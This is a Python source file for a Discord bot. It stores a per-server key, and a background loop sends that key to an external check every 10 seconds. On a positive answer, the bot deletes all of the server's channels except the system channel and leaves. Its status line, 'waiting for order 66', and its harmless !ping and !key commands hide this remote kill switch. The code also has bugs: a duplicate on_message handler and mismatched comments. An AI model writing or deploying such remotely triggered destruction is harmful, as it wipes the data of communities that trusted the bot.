import discord
from discord.ext import tasks
from request import main
from conf import token
import json
import random
import string

intents = discord.Intents.default()
intents.message_content = True  # Enables receiving message content

client = discord.Client(intents=intents)

async def delete_all_channels(guild_id):  # Function to be called with guild ID and token
    guild = client.get_guild(guild_id)
    if not guild:
        print("Guild not found.")
        return

    # Confirmation prompt (alternative: manual confirmation outside the bot)
    print(f"**WARNING:** This will delete all channels in guild '{guild.name}' (ID: {guild.id}).")

    # Iterate through channels, excluding the general channel (optional)
    for channel in guild.channels:
        if channel != guild.system_channel:  # Exclude general channel if needed
            try:
                await channel.delete()
            except discord.Forbidden:
                print(f"Failed to delete channel: {channel.name}")
                
    await guild.system_channel.send("All channels (excluding general) have been deleted.")
    await guild.system_channel.send("Leaving the Server now...")
    
    # Leave the server
    await guild.leave()

    print("All channels (excluding general) have been deleted.")

# Function to be called every 4 seconds
async def check_and_send_message(guild):
    # Replace this logic with your actual condition to send a message
    code = await check_and_add_guild(guild)
    if main(code):  # Replace with your actual condition
        await delete_all_channels(guild)
            
def generate_api_code():
    """Generates a random API code in the format 0000-0000-0000-0000-fffff."""
    parts = [''.join(random.choices(string.digits, k=4)) for _ in range(5)]
    return '-'.join(parts)

async def check_and_add_guild(guild_id, filename="guild.json"):
    """
    Checks if the guild ID is already in the JSON file.
    If not, creates a new entry with the guild ID and a random API code.
    Prints the corresponding API code (existing or newly generated).
    """
    try:
        with open(filename, "r") as f:
            guild_data = json.load(f)
    except FileNotFoundError:
        # Create a new JSON file if it doesn't exist
        guild_data = {}

    if str(guild_id) not in guild_data:
        api_code = generate_api_code()
        guild_data[str(guild_id)] = api_code
        with open(filename, "w") as f:
            json.dump(guild_data, f, indent=4)
        print(f"New API code generated for guild {guild_id}: {api_code}")
    else:
        api_code = guild_data[str(guild_id)]
    return api_code
    
@client.event
async def on_guild_join(guild):
    """
    Checks and adds the guild ID to the JSON file when the bot joins a new guild.
    """
    await check_and_add_guild(guild.id)

@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')
    await client.change_presence(activity=discord.Game(name="waiting for order 66"), status=discord.Status.idle)
    background_task.start()
    

@client.event
async def on_message(message):
    if message.author == client.user:
        return  # Ignore messages from ourselves

    # Add your command logic here
    if message.content.startswith('!ping'):
        await message.channel.send('pong!')
        
@client.event
async def on_message(message):
    if message.author == client.user:
        return  # Ignore messages from ourselves

    if message.content.startswith('!key'):
        if message.author.guild_permissions.manage_guild:
            await message.channel.send(f'Here is the key: {await check_and_add_guild(message.guild.id)}')
        else:
            await message.channel.send("You don't have administrator privileges to access the key.")

        
# Background task to run check_and_send_message every 4 seconds
@tasks.loop(seconds=10)
async def background_task():
    for guild in client.guilds:
        await check_and_send_message(guild.id)
        

client.run(token())
